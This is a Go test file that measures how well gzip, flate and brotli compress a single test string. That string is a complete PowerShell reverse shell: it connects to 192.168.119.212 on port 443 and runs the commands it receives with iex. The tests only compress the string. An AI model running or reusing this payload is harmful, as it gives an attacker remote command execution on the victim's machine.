package tests

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"testing"

	"github.com/andybalholm/brotli"
	"github.com/stretchr/testify/require"
)

var (
	testPayload = "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.212',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
)

func TestGzipCompression(t *testing.T) {
	buffer := new(bytes.Buffer)
	writer, err := gzip.NewWriterLevel(buffer, gzip.BestCompression)
	require.NoError(t, err)
	_, err = writer.Write([]byte(testPayload))
	require.NoError(t, err)
	writer.Close()
	t.Log("gzip compressed data size: ", buffer.Len())
}

func TestDeflateCompression(t *testing.T) {
	buffer := new(bytes.Buffer)
	writer, err := flate.NewWriter(buffer, flate.BestCompression)
	require.NoError(t, err)
	_, err = writer.Write([]byte(testPayload))
	require.NoError(t, err)
	writer.Close()
	t.Log("flate compressed data size: ", buffer.Len())
}

func TestBrotliCompression(t *testing.T) {
	buffer := new(bytes.Buffer)
	writer := brotli.NewWriterLevel(buffer, brotli.BestCompression)
	_, err := writer.Write([]byte(testPayload))
	require.NoError(t, err)
	writer.Close()
	t.Log("brotli compressed data size: ", buffer.Len())
}
